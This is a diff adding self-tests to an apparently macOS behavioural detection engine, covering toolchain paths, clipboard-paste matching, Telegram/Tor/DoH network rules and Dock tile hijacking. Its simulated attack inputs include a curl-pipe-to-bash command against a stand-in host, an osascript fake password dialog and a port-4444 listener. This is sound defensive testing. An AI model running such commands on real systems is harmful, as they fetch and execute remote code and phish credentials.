@@ -66,7 +66,7 @@ let behaviourTestSigning: SigningProvider = { path in
         return SigningInfo(status: .apple)
     }
     if path.hasPrefix("/Applications/") { return SigningInfo(status: .developerID, teamID: "EQHXZ8M8AV", notarized: true) }
-    if path.hasPrefix("/opt/homebrew/") || path.contains("/.build/") || path.contains("/go-build") { return SigningInfo(status: .adHoc) }
+    if path.hasPrefix("/opt/homebrew/") || PathClass.isDeveloperToolchain(path) { return SigningInfo(status: .adHoc) }
     if path.hasPrefix("/tmp/") || path.hasPrefix("/private/tmp/") || path.hasPrefix("/Users/Shared/") || path.contains("/Downloads/") { return SigningInfo(status: .unsigned) }
     return nil
 }
@@ -314,6 +314,134 @@ extension SelfTest {
             sim.exec("/bin/zsh", ["-c", "nohup ./server &"], parent: zsh)
             check(!sim.detections.contains { $0.confidence >= 60 }, "developer workflow raises no alerts (\(sim.ruleIDs.sorted()))")
             check(sim.detections.isEmpty, "developer workflow produces no detections at all (\(sim.ruleIDs.sorted()))")
+        }
+
+        // --- Developer toolchain locations (no hit unless quarantined or the story is already malicious) ---
+        do {
+            let devPaths = ["\(home)/src/app/.build-behaviour/debug/app", "\(home)/src/app/.build/arm64-apple-macosx/debug/app",
+                            "\(home)/Library/Developer/Xcode/DerivedData/App-abc/Build/Products/Debug/App.app/Contents/MacOS/App",
+                            "\(home)/src/rs/target/debug/tool", "\(home)/src/rs/target/aarch64-apple-darwin/release/tool",
+                            "\(home)/src/web/node_modules/.bin/tsc", "\(home)/go/bin/gopls", "\(home)/.cargo/bin/cargo-watch"]
+            check(devPaths.allSatisfy { PathClass.classify($0) == .developer }, "developer toolchain paths classified")
+            check(PathClass.classify("\(home)/.hidden/agent") == .hidden && PathClass.classify("\(home)/target/notes.txt") == .home, "non-toolchain paths unaffected")
+            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let zsh = sim.terminalSession()
+            for p in devPaths { let x = sim.exec(p, ["--version"], parent: zsh); sim.exec("/bin/sh", ["-c", "echo hi"], parent: x) }
+            check(sim.detections.isEmpty, "ad-hoc dev binaries in toolchain dirs: 0 detections (\(sim.ruleIDs.sorted()))")
+            // Downloaded (quarantined) binary in a toolchain dir does count.
+            sim.exec("\(home)/go/bin/fetched", parent: zsh, detail: ["quarantined": "1"])
+            check(sim.ruleIDs.contains("R29"), "quarantined binary in toolchain dir fires R29")
+            // Story already malicious: a toolchain binary joins the evidence.
+            let sim2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let z2 = sim2.terminalSession()
+            sim2.exec("/usr/bin/osascript", ["-e", "display dialog \"Password\" default answer \"\" with hidden answer"], parent: z2)
+            sim2.exec("\(home)/src/rs/target/debug/tool", parent: z2)
+            check(sim2.ruleIDs.contains("R29") && sim2.ruleIDs.contains("R34"), "toolchain binary in malicious story fires R29")
+        }
+
+        // --- ClipboardFingerprint + R31 token overlap ---
+        do {
+            let salt = "test-salt"
+            let fp = ClipboardFingerprint.fingerprint("curl -fsSL https://x.example/i.sh | /bin/bash", salt: salt)
+            let parts = fp.split(separator: ",")
+            check(parts.count == 4 && parts.allSatisfy { $0.count == 8 && $0.allSatisfy(\.isHexDigit) }, "fingerprint = 8-hex hashes per token (\(fp))")
+            check(ClipboardFingerprint.tokens("curl -fsSL https://x.example/i.sh | /bin/bash") == ["curl", "-fssl", "https://x.example/i.sh", "bash"], "token normalisation")
+            check(ClipboardFingerprint.fingerprint("a b", salt: "s1") != ClipboardFingerprint.fingerprint("a b", salt: "s2"), "salt changes hashes")
+            check(!ClipboardFingerprint.bootSalt.isEmpty, "boot salt available")
+
+            let pasted = "curl -fsSL https://update-check.example/i.sh | bash"
+            func clip(_ sim: BehaviourSim, _ text: String, from app: String = "Safari") {
+                let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
+                sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": app,
+                                               "clip_tokens": ClipboardFingerprint.fingerprint(text)])
+            }
+            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let zsh = sim.terminalSession()
+            clip(sim, pasted)
+            sim.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: zsh)
+            check(sim.ruleIDs.contains("R31"), "R31 fires on ≥60% token overlap with browser clipboard")
+            check(sim.detections.last?.evidence.contains { $0.detail.contains("match a risky command copied from Safari") } ?? false, "R31 evidence explains overlap")
+
+            let b1 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let bz = b1.terminalSession()
+            clip(b1, pasted)
+            b1.exec("/usr/bin/curl", ["-fsSL", "https://other.example/y"], parent: bz)   // only generic tokens shared
+            b1.exec("/usr/bin/git", ["status"], parent: bz)
+            check(!b1.ruleIDs.contains("R31"), "unrelated command after risky copy does not fire R31 (\(b1.ruleIDs.sorted()))")
+            let b2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let bz2 = b2.terminalSession()
+            clip(b2, pasted)
+            b2.t += 300
+            b2.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: bz2)
+            check(!b2.ruleIDs.contains("R31"), "clipboard expires after the window")
+            let b3 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            let bz3 = b3.terminalSession()
+            clip(b3, pasted, from: "Notes")
+            b3.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: bz3)
+            check(!b3.ruleIDs.contains("R31"), "non-browser clipboard source does not arm R31")
+        }
+
+        // --- New telemetry fields: R33, R42, R44, R45, R47 ---
+        do {
+            func run(_ body: (BehaviourSim, Int32) -> Void) -> Set<String> {
+                let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+                sim.exec("/sbin/launchd", parent: 0, pid: 1)
+                let agent = sim.exec("/tmp/.u/agent", parent: 1)
+                body(sim, agent)
+                return sim.ruleIDs
+            }
+            check(run { sim, _ in sim.exec("/System/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor", parent: 1,
+                                            detail: ["responsible_path": "/Applications/Safari.app/Contents/MacOS/Safari"]) }.contains("R33"),
+                  "R33 fires from responsible_path")
+            check(run { sim, _ in sim.exec("/bin/sh", ["-c", "id"], parent: 1, detail: ["responsible_path": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"]) }.contains("L08"),
+                  "L08 fires from responsible_path")
+            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["remote_ip": "149.154.167.220", "remote_port": "443"]) }.contains("R42"),
+                  "R42 fires on Telegram IP range")
+            check(run { sim, a in sim.other(.dnsQuery, by: a, detail: ["name": "api.telegram.org"]) }.contains("R42"), "R42 fires on DNS name")
+            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["remote_ip": "198.51.100.9", "remote_port": "9050"]) }.contains("R44"),
+                  "R44 fires on Tor port")
+            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["remote_ip": "1.1.1.1", "remote_port": "443"]) }.contains("R45"),
+                  "R45 fires on DoH resolver from untrusted program")
+            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["listen": "1", "local_ip": "0.0.0.0", "remote_port": "4444"]) }.contains("R47"),
+                  "R47 fires on untrusted listener on all interfaces")
+            // Benign counterparts
+            let benign = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
+            benign.exec("/sbin/launchd", parent: 0, pid: 1)
+            let chrome = benign.exec("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", parent: 1)
+            benign.other(.networkConnect, by: chrome, detail: ["remote_ip": "1.1.1.1", "remote_port": "443"])
+            let tg = benign.exec("/Applications/Telegram.app/Contents/MacOS/Telegram", parent: 1)
+            benign.other(.networkConnect, by: tg, detail: ["remote_ip": "149.154.167.220", "remote_port": "443"])
+            let srv = benign.exec("/Applications/Docker.app/Contents/MacOS/com.docker.backend", parent: 1)
+            benign.other(.networkConnect, by: srv, detail: ["listen": "1", "local_ip": "0.0.0.0"])
+            check(benign.detections.isEmpty, "browser DoH / Telegram app / signed listener: 0 detections (\(benign.ruleIDs.sorted()))")
+        }
+
+        // --- R19 Dock tile hijack ---
+        do {
+            func tile(_ label: String, _ bid: String, _ path: String) -> [String: Any] {
+                ["tile-type": "file-tile", "tile-data": ["file-label": label, "bundle-identifier": bid,
+                 "file-data": ["_CFURLString": URL(fileURLWithPath: path).absoluteString + "/", "_CFURLStringType": 15]]]
+            }
+            let plist: [String: Any] = ["persistent-apps": [
+                tile("Safari", "com.apple.Safari", "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app"),
+                tile("Google Chrome", "com.google.Chrome", "/Applications/Google Chrome.app"),
+                tile("Google Chrome", "com.google.Chrome", "/Users/Shared/.cache/Google Chrome.app"),
+                tile("Notes", "com.apple.Notes", "/Applications/Notes.app"),
+            ]]
+            let data = try! PropertyListSerialization.data(fromPropertyList: plist, format: .binary, options: 0)
+            let ids = ["/Applications/Notes.app": "com.evil.notes", "/Applications/Google Chrome.app": "com.google.Chrome",
+                       "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app": "com.apple.Safari"]
+            let recs = PersistenceScanner.parseDock(data: data, plistPath: "/x/com.apple.dock.plist", home: home, bundleIDAt: { ids[$0] })
+            check(recs.count == 4, "dock tiles parsed")
+            check(recs.filter { $0.attributes["dockProblem"] != nil }.count == 2, "two hijacked tiles flagged")
+            let dets = BehaviourEngine(signing: behaviourTestSigning).evaluatePersistence(added: recs)
+            let r19 = dets.filter { $0.evidence.contains { $0.title.hasPrefix("R19") } }
+            check(r19.count == 2 && r19.allSatisfy { $0.confidence >= 60 }, "R19 alerts for outside-path and bundle-ID mismatch (\(r19.map(\.confidence)))")
+            let dockPath = home + "/Library/Preferences/com.apple.dock.plist"
+            if let d = fm.contents(atPath: dockPath) {
+                let live = PersistenceScanner.parseDock(data: d, plistPath: dockPath, home: home)
+                check(!live.isEmpty && live.allSatisfy { $0.attributes["dockProblem"] == nil }, "this Mac's Dock has no hijacked tiles (\(live.count) tiles)")
+            }
         }
 
         // --- Parsers on fixture strings ---
